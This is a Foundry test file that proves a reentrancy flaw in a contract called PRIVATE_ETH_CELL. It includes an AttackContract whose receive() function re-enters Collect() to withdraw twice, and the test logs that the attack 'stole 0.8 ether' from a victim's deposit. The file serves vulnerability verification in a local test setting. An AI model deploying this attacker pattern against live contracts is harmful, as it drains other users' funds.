// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract ReentrancyTest is Test {
    PRIVATE_ETH_CELL public target;
    LogFile public logFile; // Renamed to avoid conflict
    AttackContract public attacker;

    function setUp() public {
        // Deploy contracts
        target = new PRIVATE_ETH_CELL();
        logFile = new LogFile();
        
        // Configure target contract
        target.SetLogFile(address(logFile));
        target.SetMinSum(0); // Set minimum sum to 0 for testing
        
        // Deploy attacker contract
        attacker = new AttackContract(payable(address(target)));
    }

    function testReentrancyVulnerability() public {
        // Victim deposits 1 ether
        address victim = makeAddr("victim");
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        target.Deposit{value: 1 ether}();
        
        // Attacker deposits 0.5 ether
        uint256 attackerDeposit = 0.5 ether;
        vm.deal(address(attacker), attackerDeposit + 0.1 ether);
        attacker.deposit{value: attackerDeposit}();
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 initialTargetBalance = address(target).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        console.log("[State] Target contract balance: %s", initialTargetBalance);
        console.log("[State] Attacker contract balance: %s", initialAttackerBalance);

        console.log("--- Trigger Attack ---");
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        uint256 currentTargetBalance = address(target).balance;
        uint256 currentAttackerBalance = address(attacker).balance;
        console.log("[State] Target contract balance: %s", currentTargetBalance);
        console.log("[State] Attacker contract balance: %s", currentAttackerBalance);

        uint256 targetChange = initialTargetBalance - currentTargetBalance;
        uint256 attackerChange = currentAttackerBalance - initialAttackerBalance;

        console.log("[Differential] Target balance change (loss): %s", targetChange);
        console.log("[Differential] Attacker balance change (gain): %s", attackerChange);

        // Check if balances changed by expected 0.8 ether
        bool vulnerabilitySuccessful = (targetChange == 0.8 ether && 
                                        attackerChange == 0.8 ether);
                                        
        if (vulnerabilitySuccessful) {
            console.log("Vulnerability Exists: Reentrancy attack successfully stole 0.8 ether");
        } else {
            console.log("Vulnerability not Exist: Expected balance changes of 0.8 ether, but got target change %s and attacker change %s", targetChange, attackerChange);
        }
    }
}

contract AttackContract {
    PRIVATE_ETH_CELL public target;
    uint256 private count;

    constructor(address payable _target) {
        target = PRIVATE_ETH_CELL(_target); // Corrected conversion
        count = 0;
    }

    function deposit() public payable {
        target.Deposit{value: msg.value}();
    }

    function attack() public {
        target.Collect(0.4 ether);
    }

    receive() external payable {
        if (count < 1) {
            count++;
            // Re-enter to withdraw again before balance update
            target.Collect(0.4 ether);
        }
    }
}